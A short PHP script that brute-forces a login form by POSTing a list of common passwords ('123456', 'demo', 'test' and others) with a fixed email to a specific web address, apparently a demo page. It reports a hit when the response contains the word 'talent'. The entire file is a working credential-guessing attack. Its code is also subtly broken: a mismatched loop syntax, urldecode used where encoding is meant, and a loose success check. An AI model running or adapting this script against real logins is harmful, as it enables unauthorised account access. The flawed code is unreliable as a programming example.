<?php
$dic = ['demo', '123', '1234', '123456', 'test', 'demo1', 'demo123', '123demo'];
foreach ($dic as $password):
  $email = 'test@demo.brute';
  $url = 'http://tqk.itps.com.vn/demo.php';
  $data_string = 'email=' .urldecode($email). '&password=' .urlencode($password);
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $result = curl_exec($ch);
  curl_close($ch);
  if (strpos($result, 'talent') == false){
    echo "<pre> Password: " .$password. " => Wrong password!</pre>";
  } else{
    echo "<pre> Password: " .$password. " => You got it.</pre>";
  }

  }
?>